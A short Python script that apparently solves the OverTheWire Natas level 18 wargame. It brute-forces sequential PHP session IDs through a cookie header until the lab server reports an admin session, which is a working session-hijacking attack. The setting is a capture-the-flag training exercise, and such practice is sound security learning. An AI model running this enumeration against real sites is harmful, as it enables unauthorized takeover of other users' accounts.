import string       # For password generation
import requests     # For http requests
from requests.auth import HTTPBasicAuth

# Basic htpp request variables
login = HTTPBasicAuth("natas18", "****") # add your own password :P
url = "http://natas18.natas.labs.overthewire.org/"

# Possible IDs
count = 1
max_ids = 640

# While we haven't found the ID...
while count <= max_ids:
    # Our custom cookie
    session = "PHPSESSID=" + str(count)
    cookie = {"Cookie": session}
    response = requests.post(url, headers = cookie, auth = login, verify = False)
    # We got a hit
    if "You are an admin" in response.text:
        print("Found: " + str(count))
        break

    count += 1
